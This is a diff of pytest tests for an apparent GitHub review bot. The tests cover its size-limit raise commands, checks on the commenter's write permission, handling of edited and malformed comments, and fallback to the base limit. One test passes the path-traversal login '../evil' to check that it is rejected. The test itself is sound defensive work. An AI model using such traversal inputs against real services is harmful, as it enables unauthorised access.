+    got, _ = evaluate([cm(4, "/oc-review size-limit 3x", minutes=2), cm(8, "/oc-review size-limit 2x", minutes=2)])
+    assert got.multiplier == 2 and got.raise_["comment_id"] == 8
+
+
+def test_a_later_rejected_raise_does_not_cancel():
+    got, _ = evaluate([cm(1, "/oc-review size-limit 4x"), cm(2, "/oc-review size-limit 2x", "reader", minutes=3),
+                       cm(3, "/oc-review size-limit 2x", minutes=4, edited=True), cm(4, "/oc-review size-limit", minutes=5)])
+    assert got.multiplier == 4 and got.raise_["comment_id"] == 1
+    assert [(r["comment_id"], r["code"]) for r in got.rejected] == [
+        (2, c.RAISE_NO_WRITE_PERMISSION), (3, c.RAISE_EDITED), (4, c.RAISE_MALFORMED)]
+
+
+def test_invalidating_the_newest_raise_brings_back_the_older_one():
+    four, two = cm(1, "/oc-review size-limit 4x"), cm(2, "/oc-review size-limit 2x", minutes=3)
+    assert evaluate([four, two])[0].multiplier == 2
+    assert evaluate([four])[0].multiplier == 4  # the 2x deleted
+    assert evaluate([four, cm(2, "/oc-review size-limit 2x", minutes=3, edited=True)])[0].multiplier == 4  # edited
+    # Both invalidated: the base limit.
+    both = evaluate([cm(1, "/oc-review size-limit 4x", edited=True), cm(2, "/oc-review size-limit 2x", minutes=3, edited=True)])[0]
+    assert (both.multiplier, both.raise_) == (1, None)
+
+
+def _comment_item(cid: int, body: str, login: str, *, edited: bool = False) -> dict:
+    return {"id": cid, "user": {"login": login, "type": "User"}, "body": body,
+            "created_at": "2026-11-01T10:00:00Z", "updated_at": "2026-11-01T10:05:00Z" if edited else "2026-11-01T10:00:00Z"}
+
+
+def test_raise_applies_to_the_limit_of_the_run():
+    fx = load("fork-pr")
+    fx["github"][f"{API_REPO}/issues/7/comments?per_page=100"] = {"status": 200, "json": [
+        _comment_item(11, "/oc-review size-limit 3x", "maint"),
+        _comment_item(12, "/oc-review size-limit 4x", "outsider"),
+        {"id": "bad shape"},
+    ]}
+    fx["github"][f"{API_REPO}/collaborators/maint/permission"] = {"status": 200, "json": {"permission": "write"}}
+    fx["github"][f"{API_REPO}/collaborators/outsider/permission"] = {"status": 404}
+    col, transport, _ = run(fx)
+    size = col.envelope["payload"]["size"]
+    assert (size["multiplier"], size["limit_tokens"], size["base_limit_tokens"]) == (3, 600_000, 200_000)
+    assert size["raise"] == {"comment_id": 11, "login": "maint", "multiplier": 3}
+    assert size["rejected_commands"] == [{"kind": "size-limit", "comment_id": 12, "login": "outsider", "code": "no-write-permission"}]
+    assert size["commands_read"] is True
+    assert all(r.method == "GET" for r in transport.requests)
+    text = render.render_bundle(col.envelope).text
+    assert "multiplier: 3" in text and "outsider" not in text
+
+
+@pytest.mark.parametrize("status", [404, 500])
+def test_unreadable_comments_give_the_base_limit_and_do_not_fail(status):
+    fx = load("fork-pr")
+    fx["github"][f"{API_REPO}/issues/7/comments?per_page=100"] = {"status": status}
+    col, _, _ = run(fx)
+    size = col.envelope["payload"]["size"]
+    assert col.envelope["status"] == "ok"
+    assert (size["multiplier"], size["limit_tokens"], size["commands_read"], size["raise"], size["rejected_commands"]) == (
+        1, 200_000, False, None, [])
+
+
+def test_read_collaborator_permission():
+    cl, t, _ = client((200, b'{"permission": "admin", "role_name": "maintain"}'))
+    assert c.read_collaborator_permission(cl, API_REPO, "a-b") == "admin"
+    assert t.requests[0].url == f"https://api.github.com{API_REPO}/collaborators/a-b/permission"
+    assert t.requests[0].max_bytes == c.PERMISSION_MAX_BYTES
+    cl, _, _ = client((404, b""))
+    assert c.read_collaborator_permission(cl, API_REPO, "a") is None
+    cl, t, _ = client()
+    assert c.read_collaborator_permission(cl, API_REPO, "../evil") is None and t.requests == []
+
+
+def test_parse_comments_skips_bad_shapes():
+    items = [_comment_item(1, "x", "a"), "not an object", {"id": 2}, {**_comment_item(3, "y", "b"), "id": True}]
+    assert [cm.id for cm in c.parse_comments(items)] == [1]
